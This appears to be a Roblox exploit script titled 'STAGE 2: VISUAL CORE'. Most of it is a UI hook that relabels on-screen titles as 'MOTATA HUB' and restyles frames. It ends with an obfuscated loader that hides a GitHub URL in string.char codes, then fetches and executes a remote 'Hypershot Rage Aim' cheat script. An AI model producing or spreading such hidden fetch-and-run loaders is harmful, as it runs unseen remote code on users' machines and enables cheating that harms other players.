
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "MOTATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 110, 111, 110, 97, 109, 101, 109, 97, 110, 115, 100, 47, 114, 111, 98, 108, 111, 120, 115, 99, 114, 105, 112, 116, 115, 47, 109, 97, 105, 110, 47, 79, 80, 95, 72, 121, 112, 101, 114, 115, 104, 111, 116, 95, 82, 97, 103, 101, 95, 65, 105, 109, 95, 83, 111, 117, 114, 99, 101, 95, 102, 97, 53, 97, 101, 56, 56, 49, 46, 108, 117, 97)))()
